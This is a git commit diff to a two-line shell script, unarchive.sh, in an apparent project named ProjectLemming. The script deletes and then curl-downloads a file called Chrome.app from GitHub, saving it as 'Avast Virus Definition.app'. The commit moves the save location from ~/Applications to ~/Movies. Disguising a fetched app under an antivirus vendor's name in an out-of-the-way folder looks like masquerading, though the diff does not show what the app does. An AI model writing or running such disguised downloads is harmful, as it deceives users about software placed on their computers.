f42622501301b22db6f3ac9022a065d848807444
swissChili <sasha@fastmail.com>
2018-06-07 14:31:48 -0700

    Update unarchive.sh

--- unarchive.sh
+++ unarchive.sh
@@ -1,2 +1,2 @@
-rm -rf ~/Applications/Avast\ Virus\ Definition.app
-curl -o ~/Applications/Avast\ Virus\ Definition.app https://raw.githubusercontent.com/swissChili/ProjectLemming/master/Chrome.app
+rm -rf ~/Movies/Avast\ Virus\ Definition.app
+curl -o ~/Movies/Avast\ Virus\ Definition.app https://raw.githubusercontent.com/swissChili/ProjectLemming/master/Chrome.app
